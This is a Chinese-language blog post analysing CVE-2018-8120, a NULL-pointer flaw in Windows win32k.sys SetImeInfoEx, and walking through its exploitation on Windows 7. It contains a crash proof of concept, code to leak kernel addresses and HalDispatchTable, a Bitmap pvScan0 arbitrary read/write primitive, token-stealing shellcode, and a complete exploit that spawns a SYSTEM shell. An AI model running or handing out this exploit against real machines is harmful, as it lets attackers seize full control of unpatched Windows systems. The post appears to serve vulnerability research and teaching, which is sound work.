---
layout: post
title:  "Windows LPE CVE-2018-8120"
date:   2021-05-14 15:20:22 +0800
categories: windows
---
## 漏洞原因

`win32k.sys` 中的`SetImeInfoEx` 对传入的`TagWindowStation` 结构的`spkList` 成员的有效性没有进行检查,导致后续代码处理中对`NULL` 解引用.

**win32k!TagWindowStation**

```c
kd> dt win32k!TagWindowStation
   +0x000 dwSessionId      : Uint4B
   +0x004 rpwinstaNext     : Ptr32 tagWINDOWSTATION
   +0x008 rpdeskList       : Ptr32 tagDESKTOP
   +0x00c pTerm            : Ptr32 tagTERMINAL
   +0x010 dwWSF_Flags      : Uint4B
   +0x014 spklList         : Ptr32 tagKL
   +0x018 ptiClipLock      : Ptr32 tagTHREADINFO
   +0x01c ptiDrawingClipboard : Ptr32 tagTHREADINFO
   +0x020 spwndClipOpen    : Ptr32 tagWND
   +0x024 spwndClipViewer  : Ptr32 tagWND
   +0x028 spwndClipOwner   : Ptr32 tagWND
   +0x02c pClipBase        : Ptr32 tagCLIP
   +0x030 cNumClipFormats  : Uint4B
   +0x034 iClipSerialNumber : Uint4B
   +0x038 iClipSequenceNumber : Uint4B
   +0x03c spwndClipboardListener : Ptr32 tagWND
   +0x040 pGlobalAtomTable : Ptr32 Void
   +0x044 luidEndSession   : _LUID
   +0x04c luidUser         : _LUID
   +0x054 psidUser         : Ptr32 Void
```

![vuln.png](../imgs/vuln.png)

## Proof of Concept

```c
#include <iostream>
#include <Windows.h>
__declspec(naked) void NtUserSetImeInfoEx(PVOID tmp) {
	_asm {
		mov esi, tmp;        //参数
		mov eax, 0x1226;     // NtUserSetImeInfoEx的调用号
		mov edx, 0x7ffe0300; // 系统调用函数入口
		call dword ptr[edx];
		ret 4;
	}
}
int main(){
		HWINSTA hWinsta = CreateWindowStationA(NULL,NULL,READ_CONTROL,NULL);
		SetProcessWindowStation(hWinsta);
		char buffer[0x100] = {0};
		NtUserSetImeInfoEx((PVOID)buffer); // keBugCheck
		return 0; // never reach
}
```

## 漏洞利用

在Windows 7 及以下版本的操作系统中, 攻击者可以调用`NtAllocateVirtualMemory` 手动来分配0页内存,此时`v3[5]` 的内存可控, 可以实施了一次任意地址写.

### 常用利用模式 HalDispatchTable劫持

在`Ntoskrnl.exe` 中有一个`HalDispatchTable` 函数指针表, 当调用`NtQueryIntervalProfile` 时,会调用到这个表的第二项指针,可以通过修改该项指针,来劫持执行流到用户层代码 ( 如果`SMEP` 未开启 )

```c
kd> u nt!NtQueryIntervalProfile+0x6b    //win7 32位
nt!NtQueryIntervalProfile+0x6b:
84119ed6 e83ae5fbff      call    nt!KeQueryIntervalProfile (840d8415)
```

```c
kd> u nt!NtQueryIntervalProfile+0x38    //win7 64位
nt!NtQueryIntervalProfile+0x38:
fffff800`0425f0d8 e8930affff      call    nt!KeQueryIntervalProfile (fffff800`0424fb70)
```

```c
kd> u nt!KeQueryIntervalProfile+0x14        //win7 32位
nt!KeQueryIntervalProfile+0x14:
840d8429 8945f0          mov     dword ptr [ebp-10h],eax
840d842c 8d45fc          lea     eax,[ebp-4]
840d842f 50              push    eax
840d8430 8d45f0          lea     eax,[ebp-10h]
840d8433 50              push    eax
840d8434 6a0c            push    0Ch
840d8436 6a01            push    1
840d8438 ff15fc83f383    call    dword ptr [nt!HalDispatchTable+0x4 (83f383fc)]    //32位是+4的地址 
```

在这种模式下,首先要获取`HalDispatchTable` 的地址,这个表存储在`Ntoskrnl.exe` 中,所有首先要泄露`Ntoskrnl.exe` 的基址.

需要注意的是对于不同的系统版本和系统的编译选项, `Ntoskrnl.exe` 这个模块的名字并不统一.

有两种方法来获取`Ntoskrnl.exe` 的基址:

### 使用未导出的ZwQuerySystemInformation API查询

API 原型:

```c
NTSTATUS WINAPI ZwQuerySystemInformation(
  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
  _Inout_   PVOID                    SystemInformation,
  _In_      ULONG                    SystemInformationLength,
  _Out_opt_ PULONG                   ReturnLength
);
```

其中`SystemInformationClass` 的取值有:

```c
typedef enum _SYSTEM_INFORMATION_CLASS {
 SystemBasicInformation, // 0 Y N
 SystemProcessorInformation, // 1 Y N
 SystemPerformanceInformation, // 2 Y N
 SystemTimeOfDayInformation, // 3 Y N
 SystemNotImplemented1, // 4 Y N
 SystemProcessesAndThreadsInformation, // 5 Y N
 SystemCallCounts, // 6 Y N
 SystemConfigurationInformation, // 7 Y N
 SystemProcessorTimes, // 8 Y N
 SystemGlobalFlag, // 9 Y Y
 SystemNotImplemented2, // 10 Y N
 SystemModuleInformation, // 11 Y N    枚举内核模块时用
 SystemLockInformation, // 12 Y N
 SystemNotImplemented3, // 13 Y N
 SystemNotImplemented4, // 14 Y N
 SystemNotImplemented5, // 15 Y N
 SystemHandleInformation, // 16 Y N
 SystemObjectInformation, // 17 Y N
 SystemPagefileInformation, // 18 Y N
 SystemInstructionEmulationCounts, // 19 Y N
 SystemInvalidInfoClass1, // 20
 SystemCacheInformation, // 21 Y Y
 SystemPoolTagInformation, // 22 Y N
 SystemProcessorStatistics, // 23 Y N
 SystemDpcInformation, // 24 Y Y
 SystemNotImplemented6, // 25 Y N
 SystemLoadImage, // 26 N Y
 SystemUnloadImage, // 27 N Y
 SystemTimeAdjustment, // 28 Y Y
 SystemNotImplemented7, // 29 Y N
 SystemNotImplemented8, // 30 Y N
 SystemNotImplemented9, // 31 Y N
 SystemCrashDumpInformation, // 32 Y N
 SystemExceptionInformation, // 33 Y N
 SystemCrashDumpStateInformation, // 34 Y Y/N
 SystemKernelDebuggerInformation, // 35 Y N
 SystemContextSwitchInformation, // 36 Y N
 SystemRegistryQuotaInformation, // 37 Y Y
 SystemLoadAndCallImage, // 38 N Y
 SystemPrioritySeparation, // 39 N Y
 SystemNotImplemented10, // 40 Y N
 SystemNotImplemented11, // 41 Y N
 SystemInvalidInfoClass2, // 42
 SystemInvalidInfoClass3, // 43
 SystemTimeZoneInformation, // 44 Y N
 SystemLookasideInformation, // 45 Y N
 SystemSetTimeSlipEvent, // 46 N Y
 SystemCreateSession, // 47 N Y
 SystemDeleteSession, // 48 N Y
 SystemInvalidInfoClass4, // 49
 SystemRangeStartInformation, // 50 Y N
 SystemVerifierInformation, // 51 Y Y
 SystemAddVerifier, // 52 N Y
 SystemSessionProcessesInformation // 53 Y N
}SYSTEM_INFORMATION_CLASS;
```

这里使用`SystemModuleInformation 11` 来获取所有内核模块的信息, 函数将返回一个结构体数组的简单包装.

```c
typedef struct _SYSTEM_MODULE_INFORMATION
{
    ULONG Count;
    SYSTEM_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
```

`SYSTEM_MODULE_ENTRY` 为模块信息结构体.

模块信息结构体的定义如下:

```c
typedef struct _SYSTEM_MODULE_ENTRY
{
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;
```

其中第一个模块默认为`Ntoskrnl.exe` 

获取基址及名字的代码:

```c

using pZwQuerySystemInformation = NTSTATUS (WINAPI *)(
  SYSTEM_INFORMATION_CLASS SystemInformationClass,
  PVOID                    SystemInformation,
  ULONG                    SystemInformationLength,
  PULONG                   ReturnLength
); // 函数指针类型定义
PSYSTEM_MODULE_INFORMATION GetNtoskrnl(HMODULE hNtdll) {
	auto ZwQuerySystemInformation = (pZwQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation"); //获取未导出api
	SIZE_T SysModLen;
	PSYSTEM_MODULE_INFORMATION SysModuleInfo;
	ZwQuerySystemInformation(SystemModuleInformation, 0, 0, &SysModLen); // 先获取所有模块信息的大小.
	SysModuleInfo = (decltype(SysModuleInfo))malloc(SysModLen);          // 分配空间存放结构体数组
	ZwQuerySystemInformation(SystemModuleInformation, SysModuleInfo, SysModLen, &SysModLen); // 填充结构体数组
	if (GetLastError() != 0) {
		RepoErrorExit("ZwQuerySystemInformation Function Fail...");
	}
	return SysModuleInfo;
}
LPCSTR inline GetNtoskrnlName(PSYSTEM_MODULE_INFORMATION sysinfo) { // 返回的FullPathName一般类似System32\system\ntoskrnl.exe
	LPCSTR NtoskrnlName = strrchr((const char*)sysinfo->Module[0].FullPathName,'\\') + 1; // 截取Ntoskrnl真实名称
	return NtoskrnlName;
}
PVOID inline GetNtoskrnlBase(PSYSTEM_MODULE_INFORMATION sysinfo) {
	return sysinfo->Module[0].ImageBase; // 获取模块基址
}
```

### 枚举驱动信息获取基址

需要预先知道正确的`ntoskrnl.exe` 名称

```c
#include<stdio.h>
#include<Windows.h>
#include<Psapi.h>

int main()
{
    LPVOID imagebase[1024];
    LPDWORD Needed = NULL;
    TCHAR imagename[1024];

    EnumDeviceDrivers(imagebase, (DWORD64)sizeof(imagebase), Needed);

    for (int i = 0; i < 1024; i++)
    {
        GetDeviceDriverBaseNameA(imagebase[i], (LPSTR)imagename, 0x40);
        if (!strcmp((LPSTR)imagename, "ntoskrnl.exe"))
        {
            printf("Imagename is %s,Imagebase is 0x%llx\n", imagename, imagebase[i]);
        }
    }
}
```

名称与处理器核数和是否支持`PAE`机制有关 

关系如下:

|  | 单处理器 | 多处理器 |
| --- | --- | --- |
| 支持PAE | ntkrnlpa.exe | ntkrpamp.exe |
| 不支持PAE | ntoskrnl.exe | ntkrnlmp.exe |

### 泄露HalDispatchTable

```c
	PSYSTEM_MODULE_INFORMATION SysModuleInfo = GetNtoskrnl(hNtdll);
	PVOID NtoskrnlBase = GetNtoskrnlBase(SysModuleInfo);
	LPCSTR NtoskrnlName = GetNtoskrnlName(SysModuleInfo);
	HMODULE hNtoskrnl = LoadLibraryA(NtoskrnlName);
	if (hNtoskrnl == INVALID_HANDLE_VALUE || hNtoskrnl == NULL) {
		RepoErrorExit("cannot load Ntoskrnl.exe...");
	}
	free(SysModuleInfo);
	PVOID HalDispatchTable = GetProcAddress(hNtoskrnl, "HalDispatchTable");
	if (GetLastError() != 0) {
		RepoErrorExit("Cannot find HalDispatchTable...");
	}
	HalDispatchTable = (PVOID)((DWORD)HalDispatchTable - (DWORD)hNtoskrnl + (DWORD)NtoskrnlBase);
	cout << "[*] HalDispatchTable: " << showbase << hex << HalDispatchTable << endl;
```

![exploit_point.png](../imgs/exploit_point.png)

注意到在代码中覆盖字节数不可控, 如果直接覆盖`HalDispatchTable`容易导致程序崩溃

故采用其他方法来控制.

### 覆盖Bitmap对象实现任意地址读写

`Bitmap`的底层内核对象`SURFACE` 部分结构: (x86)

```c
typedef struct _SURFACE {
		BASEOBJECT BaseObject; // 0x000
		SURFOBJ surfobj;       // 0x010
		XDCOBJ * pdcoAA;       // 0x044
		FLONG flags;           // 0x048
		[...]
}SURFACE, *PSURFACE;
typedef struct _SURFOBJ{
		[...]
		PVOID pvScan0;         // 0x020
		LONG lDelta;           // 0x024
		ULONG iUniq;           // 0x028
		ULONG iBitmapFormat;    // 0x02c
		USHORT iType;          // 0x030
		USHORT fjBitmap;       // 0x032
	// size                     0x034
}SURFOBJ, *PSURFOBJ;
// 具体意义可以查阅ReactOS源码
```

主要关注`_SURFACE`中的`pvScan0`成员, 它指向`Bitmap`内容的内核地址.

而`GetBitmapBits`和`SetBitmapBits`两个`api`会根据`pvScan0`的值对`Bitmap`的内容进行字节级别的读写.

故只要能覆盖`pvScan0`的值, 就能实现可控的任意地址读写.

在实际利用中,往往需要多次任意地址读写, 所以我们通过`CreateBitmap` 创建两个`Bitmap` ,将其中一个`Bitmap` 的`pvScan0` 成员修改为另一`Bitmap` 的`pvScan0` 成员的地址,这样通过如下代码, 就可以多次任意读写:

```c
VOID ReadOOB(HBITMAP hManager,HBITMAP hWorker,DWORD writeAddr, LPVOID readValue, int len)
{
  SetBitmapBits(hManager,len,&writeAddr);
  GetBitmapBits(hWorker, len, readValue);
}

VOID WriteOOB(HBITMAP hManager, HBITMAP hWorker, DWORD writeAddr, LPVOID writeValue, int len)
{
  SetBitmapBits(hManager, len, &writeAddr);
  SetBitmapBits(hWorker, len, writeValue);
}
```

这样的利用手法要求我们需要知道**_SURFACE**的**内核地址**

我们先创建`Bitmap` 

```c
HBITMAP hWorker = CreateBitmap(5, 5, 5, 5, buff);
HBITMAP hManager = CreateBitmap(5, 5, 5, 5, buff);
```

根据搜索引擎

我们知道了在win7及以下的较低版本的Windows, `CreateBitmap` 返回的`HBITMAP` 的低两字节实际上是其在**PEB**结构中的名为**GdiSharedHandleTable**的结构体数组中的索引

结构体数组中的结构体定义如下:

```c
typedef struct _GdiCell
{
     PVOID pKernelAddress;
     UINT16 wProcessIdl;
     UINT16 wCount;
     UINT16 wUpper;
     UINT16 uType;
     PVOID pUserAddress;
}GdiCell,*pGdiCell;
```

其中的`pKernelAddress` 成员就是`Bitmap` 对应的`SURFACE` 对象的**内核地址**

代码:

```c
#include <intrin.h>

DWORD GetPeb(){
	DWORD teb = __readfsdword(0x18); // teb 存储在fs:[0x18]
	DWORD peb = *(DWORD*)(((char*)teb)+0x30); // teb->ProcessEnvironmentBlock
	return peb;
}

DWORD GdiSharedHandleTable_offset = 0x094; // GdiSharedHandleTable在PEB结构中的偏移( win7 x86)
DWORD peb = GetPeb();

//获取Bitmap对应的GdiCell
pGdiCell GdiHandleTable = (pGdiCell)*(DWORD*)((char*)(peb+GdiSharedHandleTable_offset));
pGdiCell work_cell = &GdiHandleTable[(DWORD)hWorker & 0xffff];
pGdiCell manage_cell = &GdiHandleTable[(DWORD)hManager & 0xffff];

// 获取对应SURFACE内核地址
PVOID worker_krnl_addr = work_cell->pKernelAddress;
PVOID manager_krnl_addr = manage_cell->pKernelAddress;

DWORD surfobj_offset = 0x10 ; // surfobj相对于SURFACE对象的偏移
DWORD pvscan0_offset = 0x20;  // pvScan0相对于SURFOBJ对象的偏移

// 获取相应的pvScan0的地址
DWORD w_pvscan0 = (DWORD)worker_krnl_addr + surfobj_offset + pvscan0_offset;
DWORD m_pvscan0 = (DWORD)manager_krnl_addr + surfobj_offset + pvscan0_offset;
```

因为在覆盖`pvScan0` 时还会覆盖其他数据, 其中有部分数据是`SetBitmapBits` 和`GetBitmapBits` 运行所需, 所以要在payload中填充修复, 重要成员可以通过分析`bDoGetSetBitmapBits` 来获得.

这里直接给出需要修复的成员

```c
#define API_BITMAP 0x04000000
#define SHAREACCESS_SURFACE 0x00000200
#define DDB_SURFACE 0x00800000
#define STYPE_BITMAP 0L
#define BMF_TOPDOWN 0x1
#define BMF_32BPP 0x6

surfobj.lDelta = 0x180;
surfobj.iBitmapFormat = BMF_32BPP;
surfobj.iType = STYPE_BITMAP;
surfobj.fjBitmap = BMF_TOPDOWN;
surface.flags = API_BITMAP | SHAREACCEAA_SURFACE | DDB_SURFACE;
```

构造payload

```c
char payload[512] = {0};
p[0] = w_pvscan0;           // pvScan0 : Worker pvScan0
p[1] = 0x180;               // lDelta : 0x180
p[2] = 0xabcd;              // iUniq : 0xabcd
p[3] = BMF_32BPP;           // iBitmapFormat : BMF_32BPP
p[4] = STYPE_BITMAP;        // iType : STYPE_BITMAP
p[4] |= BMF_TOPDOWN << 16;  // fjBitmap : BMF_TOPDOWN
p[6] = 0x4800200;           // flags : API_BITMAP | SHAREACCESS_SURFACE | DDB_SURFACE

PDWORD tmp = NULL;
tmp[11] = m_pvscan0;   // arbitrary write addr : Manager pvScan0
tmp[5] = w_pvscan0;  // if ( v3[5] != *a2 ) {...} bypass
```

触发漏洞

```c
HWINSTA hWinsta = CreateWindowStationA(NULL, NULL, READ_CONTROL,NULL);
SetProcessWindowStation(hWinsta);
NtUserSetImeInfoEx(payload);
```

若未开启`SMEP` ,修改`HalDispatchTable` 第二项为用户层shellcode

```c
DWORD oldHalEntry = 0;
ReadOOB(hManager, hWorker, (DWORD)HalDispatchTable + 0x4, &oldHalEntry, 4);
cout << "[*] oldHalEntry: " << showbase << hex << (DWORD)oldHalEntry << endl;
DWORD shellcode = (DWORD)GetSystemToken;
WriteOOB(hManager, hWorker, (DWORD)HalDispatchTable + 0x4, &shellcode, 4);
```

```c
void __declspec(naked) GetSystemToken()
 {
     __asm
     {
         pushad
         mov eax,fs:[0x124]  //CurrentThread
         mov eax,[eax+0x150] //Process  
         lea edx,[eax+0xf8]  //MyProcess.Token
 noFind:
         mov eax,[eax+0xb8]  //Eprocess.ActiveProcessLinks
         sub eax,0xb8        //next Eprocess struct
         mov ebx,[eax+0xb4]  //PID
         cmp ebx,4
         jnz noFind
         mov eax,[eax+0xf8]    //System.Token
         mov [edx],eax
         lock inc [eax]
         lock inc[eax]
         popad
         ret
     }
 }
```

shellcode搜索系统中进程为4的进程 ( `System` ), 搜索到后, 复制其`Token` , 并替换自己进程的`Token` 实现提权.

最后调用`NtQueryIntervalProfile` 来执行shellcode, 并恢复`HalDispatchTable` 

```c
_NtQueryIntervalProfile NtQueryIntervalProfile;
ULONG Interval = 0;
NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(hNtdll,"NtQueryIntervalProfile");
NtQueryIntervalProfile(0x1337, &Interval);
WriteOOB(hManager, hWorker, (DWORD)HalDispatchTable + 0x4, &oldHalEntry, 4);
```

完整Exp

```cpp
#include <Windows.h>
#include <Psapi.h>
#include <iostream>
#include <intrin.h>
using std::cout;
using std::endl;
using std::showbase;
using std::hex;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_SUCCESS (NTSTATUS)0x0000000
typedef struct _GdiCell
{
     PVOID pKernelAddress;
     UINT16 wProcessIdl;
     UINT16 wCount;
     UINT16 wUpper;
     UINT16 uType;
     PVOID pUserAddress;
}GdiCell,*pGdiCell;
typedef struct _SYSTEM_MODULE_ENTRY
{
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION
{
    ULONG Count;
    SYSTEM_MODULE_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
typedef enum _SYSTEM_INFORMATION_CLASS {
 SystemBasicInformation, // 0 Y N
 SystemProcessorInformation, // 1 Y N
 SystemPerformanceInformation, // 2 Y N
 SystemTimeOfDayInformation, // 3 Y N
 SystemNotImplemented1, // 4 Y N
 SystemProcessesAndThreadsInformation, // 5 Y N
 SystemCallCounts, // 6 Y N
 SystemConfigurationInformation, // 7 Y N
 SystemProcessorTimes, // 8 Y N
 SystemGlobalFlag, // 9 Y Y
 SystemNotImplemented2, // 10 Y N
 SystemModuleInformation, // 11 Y N    枚举内核模块时用
 SystemLockInformation, // 12 Y N
 SystemNotImplemented3, // 13 Y N
 SystemNotImplemented4, // 14 Y N
 SystemNotImplemented5, // 15 Y N
 SystemHandleInformation, // 16 Y N
 SystemObjectInformation, // 17 Y N
 SystemPagefileInformation, // 18 Y N
 SystemInstructionEmulationCounts, // 19 Y N
 SystemInvalidInfoClass1, // 20
 SystemCacheInformation, // 21 Y Y
 SystemPoolTagInformation, // 22 Y N
 SystemProcessorStatistics, // 23 Y N
 SystemDpcInformation, // 24 Y Y
 SystemNotImplemented6, // 25 Y N
 SystemLoadImage, // 26 N Y
 SystemUnloadImage, // 27 N Y
 SystemTimeAdjustment, // 28 Y Y
 SystemNotImplemented7, // 29 Y N
 SystemNotImplemented8, // 30 Y N
 SystemNotImplemented9, // 31 Y N
 SystemCrashDumpInformation, // 32 Y N
 SystemExceptionInformation, // 33 Y N
 SystemCrashDumpStateInformation, // 34 Y Y/N
 SystemKernelDebuggerInformation, // 35 Y N
 SystemContextSwitchInformation, // 36 Y N
 SystemRegistryQuotaInformation, // 37 Y Y
 SystemLoadAndCallImage, // 38 N Y
 SystemPrioritySeparation, // 39 N Y
 SystemNotImplemented10, // 40 Y N
 SystemNotImplemented11, // 41 Y N
 SystemInvalidInfoClass2, // 42
 SystemInvalidInfoClass3, // 43
 SystemTimeZoneInformation, // 44 Y N
 SystemLookasideInformation, // 45 Y N
 SystemSetTimeSlipEvent, // 46 N Y
 SystemCreateSession, // 47 N Y
 SystemDeleteSession, // 48 N Y
 SystemInvalidInfoClass4, // 49
 SystemRangeStartInformation, // 50 Y N
 SystemVerifierInformation, // 51 Y Y
 SystemAddVerifier, // 52 N Y
 SystemSessionProcessesInformation // 53 Y N
}SYSTEM_INFORMATION_CLASS;
__declspec(naked) void NtUserSetImeInfoEx(PVOID tmp) {
	_asm {
		mov esi, tmp;
		mov eax, 0x1226;
		mov edx, 0x7ffe0300;
		call dword ptr[edx];
		ret 4;
	}
}
using pNtAllocateVirtualMemory = NTSTATUS (NTAPI *)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocateType,
	ULONG Protect
);
using pZwQuerySystemInformation = NTSTATUS (WINAPI *)(
  SYSTEM_INFORMATION_CLASS SystemInformationClass,
  PVOID                    SystemInformation,
  ULONG                    SystemInformationLength,
  PULONG                   ReturnLength
);
typedef NTSTATUS(WINAPI* _NtQueryIntervalProfile)(
	IN ULONG   ProfileSource,
    OUT PULONG Interval
);
VOID ReadOOB(HBITMAP hManager,HBITMAP hWorker,DWORD writeAddr, LPVOID readValue, int len)
{
  SetBitmapBits(hManager,len,&writeAddr);
  GetBitmapBits(hWorker, len, readValue);
}

VOID WriteOOB(HBITMAP hManager, HBITMAP hWorker, DWORD writeAddr, LPVOID writeValue, int len)
{
  SetBitmapBits(hManager, len, &writeAddr);
  SetBitmapBits(hWorker, len, writeValue);
}
void RepoErrorExit(const char* msg) {
	cout << "[!] Error " << msg << endl; 
	exit(-1);
}
void RepoSuccess(const char* msg) {
	cout << "[*] " << msg << endl;
}
void __declspec(naked) GetSystemToken()
 {
     __asm
     {
         pushad
         mov eax,fs:[0x124]  //CurrentThread
         mov eax,[eax+0x150] //Process  
         lea edx,[eax+0xf8]  //MyProcess.Token
 noFind:
         mov eax,[eax+0xb8]  //Eprocess.ActiveProcessLinks
         sub eax,0xb8        //next Eprocess struct
         mov ebx,[eax+0xb4]  //PID
         cmp ebx,4
         jnz noFind
         mov eax,[eax+0xf8]    //System.Token
         mov [edx],eax
         lock inc [eax]
         lock inc[eax]
         popad
         ret
     }
 }
PSYSTEM_MODULE_INFORMATION GetNtoskrnl(HMODULE hNtdll) {
	auto ZwQuerySystemInformation = (pZwQuerySystemInformation)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	SIZE_T SysModLen;
	PSYSTEM_MODULE_INFORMATION SysModuleInfo;
	ZwQuerySystemInformation(SystemModuleInformation, 0, 0, &SysModLen);
	SysModuleInfo = (decltype(SysModuleInfo))malloc(SysModLen);
	ZwQuerySystemInformation(SystemModuleInformation, SysModuleInfo, SysModLen, &SysModLen);
	if (GetLastError() != 0) {
		RepoErrorExit("ZwQuerySystemInformation Function Fail...");
	}
	return SysModuleInfo;
}
LPCSTR inline GetNtoskrnlName(PSYSTEM_MODULE_INFORMATION sysinfo) {
	LPCSTR NtoskrnlName = strrchr((const char*)sysinfo->Module[0].FullPathName,'\\') + 1;
	return NtoskrnlName;
}
PVOID inline GetNtoskrnlBase(PSYSTEM_MODULE_INFORMATION sysinfo) {
	return sysinfo->Module[0].ImageBase;
}
DWORD inline GetPeb() {
	DWORD teb = __readfsdword(0x18);
	DWORD peb = *(DWORD*)(((char*)teb)+0x30);
#ifdef DEBUG
	cout << "[*] Teb: " << showbase << hex << teb << endl;
	cout << "[*] Peb: " << showbase << hex << peb << endl;
#endif
	return peb;
}
int main() {
	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (hNtdll == INVALID_HANDLE_VALUE || hNtdll == NULL) {
		RepoErrorExit("cannot open ntdll.dll...");
	}
	PSYSTEM_MODULE_INFORMATION SysModuleInfo = GetNtoskrnl(hNtdll);
	PVOID NtoskrnlBase = GetNtoskrnlBase(SysModuleInfo);
	LPCSTR NtoskrnlName = GetNtoskrnlName(SysModuleInfo);
	RepoSuccess(NtoskrnlName);
	HMODULE hNtoskrnl = LoadLibraryA(NtoskrnlName);
	if (hNtoskrnl == INVALID_HANDLE_VALUE || hNtoskrnl == NULL) {
		RepoErrorExit("cannot load Ntoskrnl.exe...");
	}
	free(SysModuleInfo);
	PVOID HalDispatchTable = GetProcAddress(hNtoskrnl, "HalDispatchTable");
	if (GetLastError() != 0) {
		RepoErrorExit("Cannot find HalDispatchTable...");
#ifdef DEBUG
		cout << "GetLastError value: " << showbase << hex << GetLastError() << endl;
	}
	else {
		RepoSuccess("Find HalDispatchTable Success!");
	
#endif // DEBUG
	}

	HalDispatchTable = (PVOID)((DWORD)HalDispatchTable - (DWORD)hNtoskrnl + (DWORD)NtoskrnlBase);
	cout << "[*] HalDispatchTable: " << showbase << hex << HalDispatchTable << endl;

	/* 分配零页虚拟内存 */
	auto NtAllocateVirutalMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	if (GetLastError() != 0) {
		RepoErrorExit("Cannot find NtAllocateVirtualMemory...");
	}
#ifdef DEBUG
	else {
		RepoSuccess("Find NtAllocateVirtualMemory Success!");
	}
#endif
	DWORD BaseAddr = 0x2;
	DWORD RegionSize = 0x1000;
	NtAllocateVirutalMemory(GetCurrentProcess(), &BaseAddr, NULL, &RegionSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	char buff[1024] = { 0x90 };
	HBITMAP hWorker = CreateBitmap(5, 5, 5, 5, buff);
	HBITMAP hManager = CreateBitmap(5, 5, 5, 5, buff);
	constexpr DWORD GdiSharedHandleTable_offset = 0x094;
	DWORD peb = GetPeb();
	pGdiCell GdiHandleTable = (pGdiCell)*(DWORD*)((char*)(peb + GdiSharedHandleTable_offset));
	cout << "[*] GdiHandleTable: " << showbase << hex << GdiHandleTable << endl;
	pGdiCell work_cell = &GdiHandleTable[(DWORD)hWorker & 0xffff];
	pGdiCell manage_cell = &GdiHandleTable[(DWORD)hManager & 0xffff];
	cout << "[*] worker GdiCell: " << showbase << hex << (DWORD)work_cell << endl;
	cout << "[*] manager GdiCell: " << showbase << hex << (DWORD)manage_cell << endl;
	PVOID worker_krnl_addr = work_cell->pKernelAddress;
	PVOID manager_krnl_addr = manage_cell->pKernelAddress;
	cout << "[*] worker kernel address: " << showbase << hex << (DWORD)worker_krnl_addr << endl;
	cout << "[*] manager kernel address: " << showbase << hex << (DWORD)manager_krnl_addr << endl;
	DWORD surfobj_offset = 0x10;
	DWORD pvscan0_offset = 0x20;
	DWORD w_pvscan0 = (DWORD)worker_krnl_addr + surfobj_offset + pvscan0_offset;
	DWORD m_pvscan0 = (DWORD)manager_krnl_addr + surfobj_offset + pvscan0_offset;
	char payload[512] = { 0 };
#define API_BITMAP 0x04000000
#define SHAREACCESS_SURFACE 0x00000200
#define DDB_SURFACE 0x00800000
#define STYPE_BITMAP 0L
#define BMF_TOPDOWN 0x1
#define BMF_32BPP 0x6
	PDWORD p = (DWORD*)&payload[0];
	p[0] = w_pvscan0;           // pvScan0 : Worker pvScan0
	p[1] = 0x180;               // lDelta : 0x180
	p[2] = 0xabcd;              // iUniq : 0xabcd
	p[3] = BMF_32BPP;           // iBitmapFormat : BMF_32BPP
	p[4] = STYPE_BITMAP;        // iType : STYPE_BITMAP
	p[4] |= BMF_TOPDOWN << 16;  // fjBitmap : BMF_TOPDOWN
	p[6] = 0x4800200;           // flags : API_BITMAP | SHAREACCESS_SURFACE | DDB_SURFACE

	PDWORD tmp = NULL;
	tmp[11] = m_pvscan0;   // arbitrary write addr : Manager pvScan0
	tmp[5] = w_pvscan0;  // if ( v3[5] != *a2 ) {...} bypass
	HWINSTA hWinsta = CreateWindowStationA(NULL, NULL, READ_CONTROL,NULL);
	SetProcessWindowStation(hWinsta);
	NtUserSetImeInfoEx(payload);
	RepoSuccess("Exploit Success!");
	DWORD oldHalEntry = 0;
	ReadOOB(hManager, hWorker, (DWORD)HalDispatchTable + 0x4, &oldHalEntry, 4);
	cout << "[*] oldHalEntry: " << showbase << hex << (DWORD)oldHalEntry << endl;
	DWORD shellcode = (DWORD)GetSystemToken;
	//getchar();
	WriteOOB(hManager, hWorker, (DWORD)HalDispatchTable + 0x4, &shellcode, 4);
	_NtQueryIntervalProfile NtQueryIntervalProfile;
	ULONG Interval = 0;
	NtQueryIntervalProfile = (_NtQueryIntervalProfile)GetProcAddress(hNtdll,"NtQueryIntervalProfile");
	NtQueryIntervalProfile(0x1337, &Interval);
	WriteOOB(hManager, hWorker, (DWORD)HalDispatchTable + 0x4, &oldHalEntry, 4);
	system("cmd");
	//getchar();
	return 0;
}
```

### 通过覆盖Palette对象实现任意地址读写

// to do

也可以通过其他方式劫持执行流

### 通过劫持窗口对象lpfnWndProc成员执行用户代码

// to do

### SMEP

可以通过微软的`Coreinfo.exe` 工具查看电脑保护情况.

为`*`则代表开启, 为`-`则代表未开启.



`SMEP` 由`Cr3` 寄存器控制

比较疑惑的是使用的`win7`虚拟机显示开启了`smep`，但是也可以直接返回用户层代码利用成功。

## 参考文章

[CVE-2018-8120win32k.sys内核漏洞分析](https://021w.github.io/2021/02/24/CVE-2018-8120win32k-sys%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)

[关于CVE-2018-8120 之最新Windows提权漏洞分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/174182.html)

